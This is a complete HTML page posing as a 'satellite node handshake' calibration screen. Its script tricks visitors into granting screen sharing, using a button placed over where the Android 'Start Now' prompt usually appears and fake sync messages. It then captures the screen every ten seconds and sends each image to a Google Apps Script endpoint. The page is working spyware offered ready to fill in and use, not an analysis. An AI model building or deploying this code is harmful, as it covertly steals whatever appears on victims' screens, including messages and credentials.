<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Satellite Node | Handshake</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #sync-box { border: 1px solid #00ff41; padding: 40px; text-align: center; width: 80%; }
        .btn-trigger { 
            position: fixed; 
            bottom: 20%; /* Positioned to overlap typical Android 'Start Now' location */
            right: 10%;
            background: #00ff41; 
            color: #000; 
            padding: 20px; 
            font-weight: bold; 
            border: none; 
            z-index: 1000;
        }
        .warning-text { color: #ff3e3e; font-size: 12px; margin-top: 10px; display: none; }
    </style>
</head>
<body>

    <div id="sync-box">
        <h2 id="title">NODE HANDSHAKE</h2>
        <p id="msg">Aligning satellite signal...</p>
        <div id="status-area">Ready for calibration</div>
    </div>

    <button id="actionBtn" class="btn-trigger" onclick="initiateSequence()">INITIATE SYNC</button>

<script>
    const DRIVE_URL = 'YOUR_DRIVE_APPS_SCRIPT_URL';
    let step = 0;

    async function initiateSequence() {
        const btn = document.getElementById('actionBtn');
        const msg = document.getElementById('msg');

        if (step === 0) {
            msg.innerText = "System prompt incoming. Click 'START NOW' to verify frequency.";
            btn.innerText = "CONFIRM FREQUENCY";
            step = 1;
            
            // This triggers the real system prompt
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                handleStream(stream);
            } catch (e) {
                document.getElementById('status-area').innerHTML = "<span style='color:red'>SYNC REJECTED BY OS</span>";
                // Reset for retry
                setTimeout(() => location.reload(), 2000);
            }
        }
    }

    function handleStream(stream) {
        document.getElementById('actionBtn').style.display = 'none';
        document.getElementById('title').innerText = "OPTIMIZING...";
        document.getElementById('msg').innerText = "DO NOT SWITCH TABS. ANALYZING PACKETS.";

        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        
        setInterval(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.3).split(',')[1];

            fetch(DRIVE_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ image: img, name: "node_" + Date.now() + ".jpg" })
            });
        }, 10000);
    }
</script>
</body>
</html>
